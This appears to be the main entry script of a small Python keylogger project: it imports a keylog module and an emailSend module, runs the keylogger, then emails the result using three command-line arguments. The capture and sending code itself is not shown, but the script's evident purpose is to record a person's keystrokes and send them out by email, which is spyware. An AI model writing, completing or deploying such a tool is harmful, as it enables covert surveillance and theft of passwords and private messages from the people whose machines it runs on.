import sys
from keylog import keylog
from emailSend import emailSend
if __name__ == '__main__':
    keylog()
    emailSend(sys.argv[1], sys.argv[2], sys.argv[3])





